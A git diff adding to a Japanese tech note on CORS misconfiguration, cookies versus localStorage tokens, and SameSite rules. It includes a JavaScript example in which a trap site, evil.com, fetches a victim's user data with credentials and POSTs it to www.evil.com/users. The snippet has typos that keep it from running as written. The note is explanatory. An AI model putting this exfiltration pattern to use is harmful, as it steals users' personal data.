@@ -8,8 +8,50 @@ tag: ['nextjs']
 
 ## CORS観点から見た、Cookie vs Token(localStorage)
 
-- Cookieの場合、CORS不備があると、フィッシングサイトでもCookieを送信してしまい、悪用される可能性がある。
-- Token(localStorage)の場合、CORS不備があっても、フィッシングサイトから、localStorageは参照できないので悪用はしにくい。
+- Cookieの場合、CORS不備があるとフィッシングサイトでもCookieを送信してしまい、悪用される可能性がある。(※1)
+- Token(localStorage)の場合、CORS不備があってもフィッシングサイトから、localStorageは参照できないので悪用はしにくい。
+
+### ※1 ここでのCORS不備
+
+- API側は、Cookieを受け取るような設定になっている前提(Access-Contrl-Allow-Credentials: true)になっている。
+- リファラのドメインをそのまま、Allow-Originに追加している。←これがFWでたまにやってるNGなやつ。
+
+罠サイト`www.evil.com`から`www.api.valid.com`にAjaxでRequestを飛ばすと、Cookieが送信される。
+
+
+#### さらに補足
+
+罠サイトからCookieが飛ぶと何がまずいんだっけ。  
+例えば、ユーザーが正規サイト`www.valid.com`にアクセスして`www.api.valid.com/login`を叩く。  
+そうすると、`www.api.valid.com`名義の認証状態のCookieが発行される。  
+これ以降はユーザー情報なんかを取得したいときには、`www.api.valid.com/me`的なAPIのエンドポイントにCookieを付与してアクセスすることでユーザー自身の情報を取得できるような仕組みになってるとする。  
+
+罠サイト`www.evil.com`は`evil.js`内で以下のような処理を行うことが可能。
+
+```js
+const aggregate = async () => {
+	// このリクエストで認証状態のCookieを送信することが可能
+	const response = await fetch('https://www.api.valid/user', {mode: 'cors', credentails: 'include'})
+	// レスポンスデータからユーザー情報を取得し、別のサイトに送信
+	const user = await response.json()
+	fetch('https://www.evil.com/users', {method: 'POST', body: JSON.stringfy(user)})
+}
+```
+
+#### ↑のCookieのSamesite属性による保護補足
+
+`www.evil.com`→ `www.api.valid.com`のAPIリクエストに応じてCookieが付与されるのはあくまでもCookieのSamesite属性が`None`じゃなきゃ飛ばない。  
+SameSite属性を指定していない場合、デフォルトで`Lax`なので、実はこのケースもそこまでないんじゃないかなと思った。  
+
+本題とずれるんだけど、ややこしいのはCookieのSameSiteの定義。  
+CORSになる条件と、Cookie的にCORSになる条件が異なっている。
+
+例えば、`foo.bar.com`と`baz.bar.com`はCORS。ただ、Cookie的にはCORSではなくSamteSite扱い。  
+`eTLD + 1`が同じであればCookieはSameSiteになる、と覚えればいい。
+
+https://blog.jxck.io/entries/2021-04-21/public-suffix-list.html
+
+よくあるフロントとバックエンドで、サブドメインでドメインをわけているケースであれば、Cookie的にはSamteSite扱いになるので、SameSite属性がなんであればCookieは付与される。  
 
 ## JWTの認証/認可
 
